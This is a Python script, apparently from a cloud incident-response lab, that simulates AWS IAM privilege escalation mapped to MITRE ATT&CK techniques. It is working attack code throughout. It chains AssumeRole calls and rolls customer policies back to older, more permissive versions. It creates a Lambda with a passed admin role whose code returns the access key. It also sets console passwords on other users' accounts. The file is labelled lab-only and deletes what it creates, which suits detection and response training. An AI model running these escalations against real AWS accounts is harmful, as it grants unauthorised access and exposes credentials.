"""
IAM Privilege Escalation Attack Simulation
===========================================

MITRE ATT&CK Mapping:
    T1078.004 - Valid Accounts: Cloud Accounts (AssumeRole abuse)
    T1098     - Account Manipulation (CreateLoginProfile, policy changes)
    T1548     - Abuse Elevation Control Mechanism (PassRole + Lambda)

Techniques:
    1. AssumeRole chain - attempt to assume overly permissive roles
    2. Policy version rollback - SetDefaultPolicyVersion to restore permissive version
    3. PassRole + Lambda - create Lambda with admin execution role
    4. CreateLoginProfile - create console access for other users

WARNING: For lab use only. All operations target lab-provisioned resources.
"""

import boto3
import argparse
import time
import json
from botocore.exceptions import ClientError


BANNER = """
========================================================
  IAM Privilege Escalation - Attack Simulation
========================================================
  MITRE ATT&CK: T1078.004, T1098, T1548
  Techniques:   AssumeRole chain, Policy rollback,
                PassRole + Lambda, CreateLoginProfile
========================================================
"""


def timestamp():
    return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())


def assume_role_chain(sts, role_arn, sleep_time):
    """T1078.004 - Attempt to assume an overly permissive role."""
    print(f"\n[{timestamp()}] [T1078.004] AssumeRole Chain")
    print(f"    [*] Attempting to assume role: {role_arn}")
    try:
        resp = sts.assume_role(
            RoleArn=role_arn,
            RoleSessionName='privesc-simulation',
            DurationSeconds=900
        )
        creds = resp['Credentials']
        print(f"    [!] SUCCESS - Assumed role: {role_arn}")
        print(f"    [!] AccessKeyId: {creds['AccessKeyId'][:8]}...")
        print(f"    [!] Session expires: {creds['Expiration']}")

        # Use the assumed credentials to enumerate further
        escalated = boto3.Session(
            aws_access_key_id=creds['AccessKeyId'],
            aws_secret_access_key=creds['SecretAccessKey'],
            aws_session_token=creds['SessionToken']
        )
        esc_sts = escalated.client('sts')
        identity = esc_sts.get_caller_identity()
        print(f"    [!] Escalated identity: {identity['Arn']}")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied (Expected in locked-down lab)")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def policy_version_rollback(iam, sleep_time):
    """T1098 - Attempt SetDefaultPolicyVersion to roll back to a more permissive version."""
    print(f"\n[{timestamp()}] [T1098] Policy Version Rollback")
    print(f"    [*] Enumerating customer-managed policies...")

    try:
        policies = iam.list_policies(Scope='Local', MaxItems=20)
        for policy in policies.get('Policies', []):
            arn = policy['Arn']
            print(f"    [*] Checking policy: {arn}")

            try:
                versions = iam.list_policy_versions(PolicyArn=arn)
                non_default = [
                    v for v in versions['Versions'] if not v['IsDefaultVersion']
                ]
                if non_default:
                    target_version = non_default[0]['VersionId']
                    print(f"    [*] Attempting SetDefaultPolicyVersion -> {target_version}")
                    iam.set_default_policy_version(
                        PolicyArn=arn,
                        VersionId=target_version
                    )
                    print(f"    [!] SUCCESS - Rolled back {arn} to {target_version}")
                else:
                    print(f"    [-] No alternative versions for {arn}")
            except ClientError as e:
                code = e.response['Error']['Code']
                if code == 'AccessDenied':
                    print(f"    [+] AccessDenied on {arn} (Expected)")
                else:
                    print(f"    [-] Failed on {arn}: {code}")
            time.sleep(sleep_time)

    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied listing policies (Expected)")
        else:
            print(f"    [-] Failed: {code}")


def passrole_lambda(iam, lam, role_arn, sleep_time):
    """T1548 - Attempt to create a Lambda function with an admin execution role."""
    print(f"\n[{timestamp()}] [T1548] PassRole + Lambda Escalation")
    func_name = 'privesc-simulation-func'

    # Inline function code that would read credentials from the environment
    code_payload = (
        'import os, json\n'
        'def handler(event, context):\n'
        '    return {"statusCode": 200, "body": json.dumps('
        '{"ACCESS_KEY": os.environ.get("AWS_ACCESS_KEY_ID", "N/A")})}\n'
    )
    import zipfile
    import io
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('lambda_function.py', code_payload)
    zip_bytes = buf.getvalue()

    print(f"    [*] Attempting to create Lambda '{func_name}' with role: {role_arn}")
    try:
        lam.create_function(
            FunctionName=func_name,
            Runtime='python3.12',
            Role=role_arn,
            Handler='lambda_function.handler',
            Code={'ZipFile': zip_bytes},
            Description='Privilege escalation simulation',
            Timeout=30
        )
        print(f"    [!] SUCCESS - Lambda created with admin role")

        # Clean up
        print(f"    [*] Cleaning up: deleting function '{func_name}'")
        lam.delete_function(FunctionName=func_name)
        print(f"    [+] Cleanup complete")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied creating Lambda (Expected)")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def create_login_profile(iam, sleep_time):
    """T1098 - Attempt to create console login profiles for other IAM users."""
    print(f"\n[{timestamp()}] [T1098] CreateLoginProfile")
    print(f"    [*] Enumerating IAM users...")

    try:
        users = iam.list_users(MaxItems=10)
        for user in users.get('Users', []):
            username = user['UserName']
            print(f"    [*] Attempting CreateLoginProfile for: {username}")
            try:
                iam.create_login_profile(
                    UserName=username,
                    Password='SimulatedP@ss123!',
                    PasswordResetRequired=True
                )
                print(f"    [!] SUCCESS - Console access created for {username}")

                # Immediately remove it (lab safety)
                print(f"    [*] Cleaning up: deleting login profile for {username}")
                iam.delete_login_profile(UserName=username)
                print(f"    [+] Cleanup complete for {username}")
            except ClientError as e:
                code = e.response['Error']['Code']
                if code == 'AccessDenied':
                    print(f"    [+] AccessDenied for {username} (Expected)")
                elif code == 'EntityAlreadyExists':
                    print(f"    [-] Login profile already exists for {username}")
                else:
                    print(f"    [-] Failed for {username}: {code}")
            time.sleep(sleep_time)

    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied listing users (Expected)")
        else:
            print(f"    [-] Failed: {code}")


def simulate(profile, region, role_arn, sleep_time):
    print(BANNER)
    print(f"[{timestamp()}] Starting IAM Privilege Escalation simulation")
    print(f"[{timestamp()}] Profile: {profile} | Region: {region}")

    session = boto3.Session(profile_name=profile, region_name=region)
    sts = session.client('sts')
    iam = session.client('iam')
    lam = session.client('lambda')

    try:
        identity = sts.get_caller_identity()
        print(f"[{timestamp()}] Identity: {identity['Arn']}")
    except Exception as e:
        print(f"[{timestamp()}] [!] Failed to get identity: {e}")
        return

    # Technique 1: AssumeRole chain
    assume_role_chain(sts, role_arn, sleep_time)

    # Technique 2: Policy version rollback
    policy_version_rollback(iam, sleep_time)

    # Technique 3: PassRole + Lambda
    passrole_lambda(iam, lam, role_arn, sleep_time)

    # Technique 4: CreateLoginProfile
    create_login_profile(iam, sleep_time)

    print(f"\n[{timestamp()}] IAM Privilege Escalation simulation complete")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='IAM Privilege Escalation attack simulation for Cloud IR Lab'
    )
    parser.add_argument('--profile', required=True, help='AWS CLI profile name')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--role-arn', required=True,
                        help='Target role ARN for AssumeRole and PassRole techniques')
    parser.add_argument('--sleep', type=float, default=1.0,
                        help='Sleep between actions (seconds)')

    args = parser.parse_args()
    simulate(args.profile, args.region, args.role_arn, args.sleep)
